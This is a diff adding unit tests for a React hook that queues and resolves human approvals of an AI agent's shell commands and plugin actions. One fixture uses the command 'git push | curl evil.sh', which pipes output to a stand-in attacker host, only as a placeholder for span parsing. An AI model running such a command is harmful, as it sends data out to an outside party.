@@ -99,3 +99,254 @@ describe("useExecApprovals.dismiss", () => {
     expect(sendReqMock).not.toHaveBeenCalled();
   });
 });
+
+describe("useExecApprovals — exec metadata parsing (A)", () => {
+  beforeEach(() => {
+    eventHandlers.clear();
+    sendReqMock = vi.fn();
+  });
+
+  function emitWithMeta(id: string) {
+    for (const h of eventHandlers) {
+      h("exec.approval.requested", {
+        id,
+        request: {
+          command: "git push | curl evil.sh",
+          host: "gateway",
+          security: "allowlist",
+          ask: "on-miss",
+          commandSpans: [
+            { startIndex: 0, endIndex: 3 }, // "git"
+            { startIndex: 11, endIndex: 15 }, // "curl"
+            { startIndex: -1, endIndex: 2 }, // invalid: dropped
+            { startIndex: 5, endIndex: 999 }, // invalid: beyond length, dropped
+          ],
+          allowedDecisions: ["allow-once", "allow-always", "deny"],
+          sessionKey: "agent:agent_x:user_test",
+        },
+        expiresAtMs: Date.now() + 60_000,
+      });
+    }
+  }
+
+  it("threads security/ask and validated commandSpans onto the queue entry", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithMeta("m1"));
+    expect(result.current.queue).toHaveLength(1);
+    const req = result.current.queue[0];
+    expect(req.security).toBe("allowlist");
+    expect(req.ask).toBe("on-miss");
+    expect(req.commandSpans).toEqual([
+      { startIndex: 0, endIndex: 3 },
+      { startIndex: 11, endIndex: 15 },
+    ]);
+  });
+
+  it("omits commandSpans entirely when none are valid", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => {
+      for (const h of eventHandlers) {
+        h("exec.approval.requested", {
+          id: "m2",
+          request: {
+            command: "ls",
+            commandSpans: [{ startIndex: 5, endIndex: 9 }],
+            host: "gateway",
+            sessionKey: "agent:a:user_test",
+          },
+          expiresAtMs: Date.now() + 60_000,
+        });
+      }
+    });
+    expect(result.current.queue[0].commandSpans).toBeUndefined();
+  });
+});
+
+describe("useExecApprovals — personal :main session routing (D)", () => {
+  beforeEach(() => {
+    eventHandlers.clear();
+    sendReqMock = vi.fn();
+  });
+
+  function emitWithSessionKey(id: string, sessionKey: string, type = "exec.approval.requested") {
+    for (const h of eventHandlers) {
+      h(type, {
+        id,
+        request: {
+          command: "ls",
+          host: "gateway",
+          allowedDecisions: ["allow-once", "deny"],
+          // plugin fields (harmless for exec; used by the plugin variant)
+          pluginId: "plugin:slack",
+          title: "Send Slack message",
+          sessionKey,
+        },
+        createdAtMs: Date.now(),
+        expiresAtMs: Date.now() + 60_000,
+      });
+    }
+  }
+
+  it("ACCEPTS a personal-webchat :main exec approval for any signed-in user", () => {
+    // Personal accounts route under sessionKey `agent:<agentId>:main` — the
+    // trailing segment is the literal "main", not a Clerk user id. The guard
+    // must accept it so personal users still get their exec card.
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithSessionKey("pm1", "agent:agent_x:main"));
+    expect(result.current.queue).toHaveLength(1);
+    expect(result.current.queue[0].id).toBe("pm1");
+  });
+
+  it("ACCEPTS a personal-webchat :main plugin approval for any signed-in user", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithSessionKey("pm2", "agent:agent_x:main", "plugin.approval.requested"));
+    expect(result.current.queue).toHaveLength(1);
+    expect(result.current.queue[0].id).toBe("pm2");
+  });
+
+  it("ACCEPTS an org approval addressed to the current user", () => {
+    // current user is user_test (mocked useAuth above)
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithSessionKey("og1", "agent:agent_x:user_test"));
+    expect(result.current.queue).toHaveLength(1);
+  });
+
+  it("DROPS an org approval addressed to a different member", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitWithSessionKey("og2", "agent:agent_x:user_other"));
+    expect(result.current.queue).toHaveLength(0);
+  });
+});
+
+describe("useExecApprovals — plugin approvals (B)", () => {
+  beforeEach(() => {
+    eventHandlers.clear();
+    sendReqMock = vi.fn();
+  });
+
+  function emitPlugin(id: string) {
+    for (const h of eventHandlers) {
+      h("plugin.approval.requested", {
+        id,
+        request: {
+          pluginId: "plugin:slack",
+          title: "Send Slack message to #general",
+          description: "The agent wants to post a message.",
+          severity: "medium",
+          agentId: "agent_x",
+          sessionKey: "agent:agent_x:user_test",
+          allowedDecisions: ["allow-once", "deny"],
+        },
+        createdAtMs: Date.now(),
+        expiresAtMs: Date.now() + 60_000,
+      });
+    }
+  }
+
+  it("enqueues a plugin approval with kind=plugin and plugin fields", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitPlugin("p1"));
+    expect(result.current.queue).toHaveLength(1);
+    const req = result.current.queue[0];
+    expect(req.kind).toBe("plugin");
+    expect(req.pluginTitle).toBe("Send Slack message to #general");
+    expect(req.pluginDescription).toBe("The agent wants to post a message.");
+    expect(req.pluginSeverity).toBe("medium");
+    expect(req.pluginId).toBe("plugin:slack");
+    expect(req.agentId).toBe("agent_x");
+    expect(req.command).toBe("Send Slack message to #general"); // command slot reused
+  });
+
+  it("defaults a plugin approval with no allowedDecisions to the full set (keeps Trust)", () => {
+    // Upstream's resolvePluginApprovalRequestAllowedDecisions falls back to
+    // DEFAULT_PLUGIN_APPROVAL_DECISIONS (allow-once/allow-always/deny) when the
+    // payload omits allowedDecisions, and the server validates a resolve against
+    // that default — so allow-always (Trust) must be offered, not dropped.
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => {
+      for (const h of eventHandlers) {
+        h("plugin.approval.requested", {
+          id: "pd1",
+          request: {
+            pluginId: "plugin:slack",
+            title: "Send Slack message to #general",
+            agentId: "agent_x",
+            sessionKey: "agent:agent_x:user_test",
+            // allowedDecisions intentionally omitted
+          },
+          createdAtMs: Date.now(),
+          expiresAtMs: Date.now() + 60_000,
+        });
+      }
+    });
+    expect(result.current.queue).toHaveLength(1);
+    expect(result.current.queue[0].allowedDecisions).toEqual([
+      "allow-once",
+      "allow-always",
+      "deny",
+    ]);
+  });
+
+  it("drops a plugin approval with no title", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => {
+      for (const h of eventHandlers) {
+        h("plugin.approval.requested", {
+          id: "p2",
+          request: { pluginId: "x" },
+          createdAtMs: Date.now(),
+          expiresAtMs: Date.now() + 1000,
+        });
+      }
+    });
+    expect(result.current.queue).toHaveLength(0);
+  });
+
+  it("resolves a plugin approval via plugin.approval.resolve", async () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitPlugin("p3"));
+    await act(async () => {
+      await result.current.resolve("p3", "allow-once");
+    });
+    expect(sendReqMock).toHaveBeenCalledWith("plugin.approval.resolve", {
+      id: "p3",
+      decision: "allow-once",
+    });
+    expect(result.current.queue).toHaveLength(0);
+  });
+
+  it("resolves an exec approval via exec.approval.resolve (kind routing)", async () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => {
+      for (const h of eventHandlers) {
+        h("exec.approval.requested", {
+          id: "e9",
+          request: {
+            command: "ls",
+            host: "gateway",
+            sessionKey: "agent:a:user_test",
+            allowedDecisions: ["allow-once", "deny"],
+          },
+          expiresAtMs: Date.now() + 60_000,
+        });
+      }
+    });
+    await act(async () => {
+      await result.current.resolve("e9", "allow-once");
+    });
+    expect(sendReqMock).toHaveBeenCalledWith("exec.approval.resolve", {
+      id: "e9",
+      decision: "allow-once",
+    });
+  });
+
+  it("drops a plugin approval on plugin.approval.resolved event", () => {
+    const { result } = renderHook(() => useExecApprovals());
+    act(() => emitPlugin("p4"));
+    expect(result.current.queue).toHaveLength(1);
+    act(() => {
+      for (const h of eventHandlers) h("plugin.approval.resolved", { id: "p4" });
+    });
+    expect(result.current.queue).toHaveLength(0);
+  });
+});
